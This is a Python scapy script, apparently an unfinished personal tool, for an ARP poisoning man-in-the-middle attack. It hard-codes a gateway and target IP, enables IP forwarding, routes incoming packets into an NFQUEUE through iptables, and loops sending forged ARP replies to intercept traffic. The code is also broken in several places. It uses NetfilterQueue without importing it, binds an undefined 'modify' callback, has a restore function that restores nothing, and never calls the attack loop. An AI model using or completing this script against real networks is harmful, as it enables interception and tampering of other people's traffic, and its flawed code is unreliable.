#!/usr/bin/env python3
#coding: utf-8
from scapy.all import *
import os
import signal
import sys
import threading
import time

#ARP Poison parameters
gateway_ip = "172.17.64.0"
target_ip = "172.17.65.92"
packet_count = 1000
conf.iface = "enp2s0"
conf.verb = 0

#Given an IP, get the MAC. Broadcast ARP Request for a IP Address. Should recieve
#an ARP reply with MAC Address
def get_mac(ip_address):
    ans, unans = arping(ip_address)
    print(ans)
    print(unans)
    for s, r in ans:
        return r[Ether].src

#Restore the network by reversing the ARP poison attack. Broadcast ARP Reply with
#correct MAC and IP Address information
def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
    # do something
    #Disable IP Forwarding on a mac
    os.system("sysctl -w net.ipv4.ip_forward=0")

#Keep sending false ARP replies to put our machine in the middle to intercept packets
#This will use our interface MAC address as the hwsrc for the ARP reply
def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac):
    print("[*] Started ARP poison attack [CTRL-C to stop]")
    try:
        while True:
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
            time.sleep(2)
    except KeyboardInterrupt:
        print("[*] Stopped ARP poison attack. Restoring network")
        restore_network(gateway_ip, gateway_mac, target_ip, target_mac)

#Start the script
print("[*] Starting script: arp_poison.py")
print("[*] Enabling IP forwarding")
#Enable IP Forwarding on a mac
os.system("sysctl -w net.ipv4.ip_forward=1")
print(f"[*] Gateway IP address: {gateway_ip}")
print(f"[*] Target IP address: {target_ip}")
#Adding package to NFQUEUE before executing rule
#os.system('iptables -A FORWARD -j NFQUEUE --queue-num 73')
os.system('iptables -A INPUT -j NFQUEUE --queue-num 73')

nfqueue = NetfilterQueue()
nfqueue.bind(73, modify)


gateway_mac = get_mac(gateway_ip)
if gateway_mac is None:
    print("[!] Unable to get gateway MAC address. Exiting..")
    sys.exit(0)
else:
    print(f"[*] Gateway MAC address: {gateway_mac}")

target_mac = get_mac(target_ip)
if target_mac is None:
    print("[!] Unable to get target MAC address. Exiting..")
    sys.exit(0)
else:
    print(f"[*] Target MAC address: {target_mac}")
